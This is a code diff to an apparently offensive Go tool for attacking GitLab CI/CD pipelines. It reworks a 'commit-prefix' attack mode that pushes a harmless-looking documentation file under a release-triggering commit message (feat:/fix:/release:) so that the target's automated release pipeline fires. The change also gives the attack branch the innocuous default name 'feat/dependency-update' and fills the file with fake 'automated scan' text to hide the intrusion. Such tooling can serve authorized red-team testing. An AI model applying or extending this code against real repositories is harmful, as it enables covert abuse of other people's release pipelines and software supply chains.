@@ -2235,10 +2235,13 @@ var attackCmd = &cobra.Command{
 			return nil
 		}
 
-		// commit-prefix mode
+		// commit-prefix mode — commit a benign file change with a release-triggering
+		// prefix (feat:/fix:/release:) to abuse automated release pipelines.
+		// Unlike --commit-ci, this does NOT overwrite .gitlab-ci.yml — it creates
+		// a small file so the target's existing CI config runs with the attacker's commit message.
 		if atkCommitPrefix {
 			if strings.TrimSpace(atkBranch) == "" {
-				atkBranch = "gogatoz-prefix"
+				atkBranch = "feat/dependency-update"
 			}
 			commitMsg := payloadgen.GenerateCommitPrefixMessage(payloadgen.CommitPrefixOptions{
 				Prefix:  strings.TrimSpace(atkPrefixValue),
@@ -2247,33 +2250,31 @@ var attackCmd = &cobra.Command{
 			if strings.TrimSpace(atkMessage) == "" {
 				atkMessage = commitMsg
 			}
-			yaml := payloadgen.GenerateCommitPrefixYAML(payloadgen.CommitPrefixYAMLOptions{
-				Common: payloadgen.CommonOptions{
-					JobName: strings.TrimSpace(atkJobName),
-					Stage:   strings.TrimSpace(atkStage),
-					Image:   strings.TrimSpace(atkImage),
-					Tags:    parseTags(atkTags),
-					Manual:  atkManual,
-				},
-			})
-			finalBranch, err := commitPayloadToBranch(ctx, client, atkTarget, atkBranch, atkDeconflict, atkAuthorName, atkAuthorEmail, atkMessage, yaml)
-			if err != nil {
-				return fmt.Errorf("commit commit-prefix payload: %w", err)
+			att := attack.NewAttacker(client, strings.TrimSpace(gitlabURL), atkAuthorName, atkAuthorEmail, 0)
+			if _, err := att.SetupUser(ctx); err != nil {
+				return fmt.Errorf("setup user: %w", err)
 			}
-			fmt.Fprintf(cmd.ErrOrStderr(), "[attack] committed with prefix message %q to branch %s\n", atkMessage, finalBranch)
+			if err := att.EnsureBranch(ctx, atkTarget, atkBranch); err != nil {
+				return fmt.Errorf("ensure branch: %w", err)
+			}
+			benignContent := "# Dependency Update\n\nUpdated dependency versions per automated scan.\n"
+			if err := att.UpsertFile(ctx, atkTarget, atkBranch, "docs/dependency-update.md", benignContent, atkMessage); err != nil {
+				return fmt.Errorf("commit prefix file: %w", err)
+			}
+			fmt.Fprintf(cmd.ErrOrStderr(), "[attack] committed with prefix message %q to branch %s\n", atkMessage, atkBranch)
 			if outputJSON {
 				out := struct {
 					Branch  string `json:"branch"`
 					Message string `json:"commit_message"`
 				}{
-					Branch:  finalBranch,
+					Branch:  atkBranch,
 					Message: atkMessage,
 				}
 				b, _ := json.MarshalIndent(out, "", "  ")
 				_, err := fmt.Fprintln(cmd.OutOrStdout(), string(b))
 				return err
 			}
-			renderSuccess(cmd.OutOrStdout(), fmt.Sprintf("Commit prefix attack committed to branch %s with message %q", finalBranch, atkMessage))
+			renderSuccess(cmd.OutOrStdout(), fmt.Sprintf("Commit prefix attack committed to branch %s with message %q", atkBranch, atkMessage))
 			return nil
 		}
 
